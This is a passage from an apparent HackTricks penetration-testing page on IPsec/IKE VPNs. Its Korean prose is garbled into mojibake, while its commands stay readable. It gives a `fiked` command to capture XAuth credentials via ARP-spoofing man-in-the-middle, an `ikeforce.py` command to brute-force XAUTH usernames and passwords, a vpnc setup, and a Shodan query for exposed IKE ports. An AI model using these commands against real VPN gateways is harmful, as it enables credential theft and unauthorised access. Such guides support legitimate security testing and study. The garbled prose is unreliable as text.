**IKEv2**ë¡œ ì „í™˜í•˜ë©´ì„œ **EAP (í™•ì¥ ì¸ì¦ í”„ë¡œí† ì½œ)**ì´ ì‚¬ìš©ì ì¸ì¦ì„ ìœ„í•´ **XAuth** ëŒ€ì‹  ì‚¬ìš©ë˜ëŠ” ì£¼ëª©í•  ë§Œí•œ ë³€í™”ê°€ ê´€ì°°ë©ë‹ˆë‹¤. ì´ ë³€í™”ëŠ” ë³´ì•ˆ í†µì‹  í”„ë¡œí† ì½œ ë‚´ì—ì„œ ì¸ì¦ ê´€í–‰ì˜ ì§„í™”ë¥¼ ê°•ì¡°í•©ë‹ˆë‹¤.

### ë¡œì»¬ ë„¤íŠ¸ì›Œí¬ MitMì„ í†µí•œ ìê²© ì¦ëª… ìº¡ì²˜

ë”°ë¼ì„œ _fiked_ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¡œê·¸ì¸ ë°ì´í„°ë¥¼ ìº¡ì²˜í•˜ê³  ê¸°ë³¸ ì‚¬ìš©ì ì´ë¦„ì´ ìˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ìŠ¤ë‹ˆí•‘ì„ ìœ„í•´ IKE íŠ¸ë˜í”½ì„ `fiked`ë¡œ ë¦¬ë””ë ‰ì…˜í•´ì•¼ í•˜ë©°, ì´ëŠ” ARP ìŠ¤í‘¸í•‘ì˜ ë„ì›€ìœ¼ë¡œ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤, [ìì„¸í•œ ì •ë³´](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). FikedëŠ” VPN ì—”ë“œí¬ì¸íŠ¸ë¡œ ì‘ë™í•˜ë©° XAuth ìê²© ì¦ëª…ì„ ìº¡ì²˜í•©ë‹ˆë‹¤:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
ë˜í•œ, IPSecì„ ì‚¬ìš©í•˜ì—¬ MitM ê³µê²©ì„ ì‹œë„í•˜ê³  í¬íŠ¸ 500ìœ¼ë¡œì˜ ëª¨ë“  íŠ¸ë˜í”½ì„ ì°¨ë‹¨í•˜ì‹­ì‹œì˜¤. IPSec í„°ë„ì„ ì„¤ì •í•  ìˆ˜ ì—†ëŠ” ê²½ìš° íŠ¸ë˜í”½ì´ í‰ë¬¸ìœ¼ë¡œ ì „ì†¡ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ikeforceë¡œ XAUTH ì‚¬ìš©ì ì´ë¦„ ë° ë¹„ë°€ë²ˆí˜¸ ë¬´ì°¨ë³„ ëŒ€ì…

ìœ íš¨í•œ ê·¸ë£¹ ì´ë¦„ **id**ì™€ **psk**ë¥¼ ì•Œê³  ìˆì„ ë•Œ **XAUTH**ë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ë ¤ë©´ ì‚¬ìš©ì ì´ë¦„ ë˜ëŠ” ì‚¬ìš©ì ì´ë¦„ ëª©ë¡ê³¼ ë¹„ë°€ë²ˆí˜¸ ëª©ë¡ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
ì´ë ‡ê²Œ í•˜ë©´ ikeforceëŠ” ê° username:password ì¡°í•©ì„ ì‚¬ìš©í•˜ì—¬ ì—°ê²°ì„ ì‹œë„í•©ë‹ˆë‹¤.

í•˜ë‚˜ ì´ìƒì˜ ìœ íš¨í•œ ë³€í™˜ì„ ì°¾ì•˜ë‹¤ë©´ ì´ì „ ë‹¨ê³„ì™€ ê°™ì´ ì‚¬ìš©í•˜ë©´ ë©ë‹ˆë‹¤.

## IPSEC VPN ì¸ì¦

Kaliì—ì„œëŠ” **VPNC**ë¥¼ ì‚¬ìš©í•˜ì—¬ IPsec í„°ë„ì„ ì„¤ì •í•©ë‹ˆë‹¤. **í”„ë¡œíŒŒì¼**ì€ ë””ë ‰í† ë¦¬ `/etc/vpnc/`ì— ìœ„ì¹˜í•´ì•¼ í•©ë‹ˆë‹¤. ì´ í”„ë¡œíŒŒì¼ì€ ëª…ë ¹ _**vpnc**_ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹œì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ ëª…ë ¹ ë° êµ¬ì„±ì€ VPNCë¡œ VPN ì—°ê²°ì„ ì„¤ì •í•˜ëŠ” ê³¼ì •ì„ ì„¤ëª…í•©ë‹ˆë‹¤:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
In this setup:

* `[VPN_GATEWAY_IP]`ë¥¼ VPN ê²Œì´íŠ¸ì›¨ì´ì˜ ì‹¤ì œ IP ì£¼ì†Œë¡œ êµì²´í•©ë‹ˆë‹¤.
* `[VPN_CONNECTION_ID]`ë¥¼ VPN ì—°ê²°ì˜ ì‹ë³„ìë¡œ êµì²´í•©ë‹ˆë‹¤.
* `[VPN_GROUP_SECRET]`ë¥¼ VPNì˜ ê·¸ë£¹ ë¹„ë°€ë¡œ êµì²´í•©ë‹ˆë‹¤.
* `[VPN_USERNAME]` ë° `[VPN_PASSWORD]`ë¥¼ VPN ì¸ì¦ ìê²© ì¦ëª…ìœ¼ë¡œ êµì²´í•©ë‹ˆë‹¤.
* `[PID]`ëŠ” `vpnc`ê°€ ì‹œì‘ë  ë•Œ í• ë‹¹ë  í”„ë¡œì„¸ìŠ¤ IDë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

VPNì„ êµ¬ì„±í•  ë•Œ ìë¦¬ í‘œì‹œìë¥¼ ì‹¤ì œ ì•ˆì „í•œ ê°’ìœ¼ë¡œ êµì²´í•´ì•¼ í•©ë‹ˆë‹¤.

## Reference Material

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
</details>
{% endhint %}
